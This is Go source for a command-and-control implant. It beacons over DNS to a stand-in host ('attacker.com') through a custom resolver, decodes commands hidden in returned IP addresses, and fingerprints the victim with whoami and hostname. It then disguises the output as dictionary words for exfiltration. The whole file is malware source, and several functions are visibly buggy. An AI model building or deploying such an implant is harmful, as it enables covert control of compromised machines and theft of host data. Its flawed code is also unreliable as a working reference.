package main

import (
	"bufio"
	"context"
	"crypto/md5"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"
)

var (
	// The C2 server's IP address
	serverIP = "127.0.0.1"
	// The C2 server's port
	serverPort = 5353
)

func getdict() map[string]string {
	// Get the dictionary
	corp := ""
	// Read from corpus.txt
	file, err := os.Open("corpus.txt")
	if err != nil {
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		corp += scanner.Text() + ","
	}

	corpus := strings.Split(corp, ",")
	letters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890+/="
	inc := 0
	dict := map[string]string{}

	// for all combinations of letters set a corpus word for all of them
	for _, i := range letters {
		for _, j := range letters {
			for _, k := range letters {
				dict[string(i)+string(j)+string(k)] = corpus[inc]
				inc++
			}
		}
	}
	return dict
}

func mnemonicencode(dict map[string]string, str string) string {
	fmt.Println(str)
	out := ""

	for i := 0; i < len(str); i += 3 {
		if i == len(str)-4 {
			out += dict[string(str[i])+"   "]
		} else {
			out += dict[string(str[i])+string(str[i+1])+string(str[i+2])]
		}
	}

	return out
}

func ipdecode(ips []string) string {
	// Join the lines with a .
	todecode := strings.Join(ips, ".")
	// Split the IPs by .
	ascii_character := strings.Split(todecode, ".")
	// Convert each ascii to a char
	chars := make([]string, len(ascii_character))
	for i, ascii := range ascii_character {
		chars[i] = string(func(a int, _ error) int { return a }(strconv.Atoi(ascii)))
	}
	// Join the chars
	out := strings.Join(chars, "")

	// Strip the spaces from the end
	return strings.TrimSpace(out)
}

func queryencode(dict map[string]string, str string) {
	// Encode the query
	mnemonicencode(dict, str)
}

func dnsquery(query string) string {
	// Perform a dns query
	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{}
			return d.DialContext(ctx, network, fmt.Sprintf("%s:%d", serverIP, serverPort))
		},
	}
	ip, _ := r.LookupHost(context.Background(), fmt.Sprintf("%s.attacker.com", query))
	return ipdecode(ip)
}

func execute(cmd string) string {
	// Execute a shell command
	out, _ := exec.Command(cmd).CombinedOutput()

	return string(out)
}

func kill() {
	// Get the current process id
	pid := os.Getpid()
	// Kill the process
	syscall.Kill(pid, 9)
}

func ping(dict map[string]string) {
	// Send the ping to the C2 server
	response := dnsquery("ping")
	if response == "fingerprint" {
		// Fingerprint machine and send back to c2 server
		switch runtime.GOOS {
		case "windows":
			md5sum := md5.New().Sum([]byte(execute("powershell.exe -c \"whoami\"")))
			fmt.Println(mnemonicencode(dict, fmt.Sprintf("%x\n", md5sum)))

		case "linux":
			md5sum := md5.New().Sum([]byte(execute("echo $(whoami)$(hostname)")))
			fmt.Println(mnemonicencode(dict, fmt.Sprintf("%x\n", md5sum)))

		case "darwin":
			md5sum := md5.New().Sum([]byte(execute("echo $(whoami)$(hostname)")))
			fmt.Println(mnemonicencode(dict, fmt.Sprintf("%x\n", md5sum)))

		}
	} else {
		kill()
	}
}

func main() {
	// Get the dictionary
	dict := getdict()
	// Agent for the C2 server
	ping(dict)
}
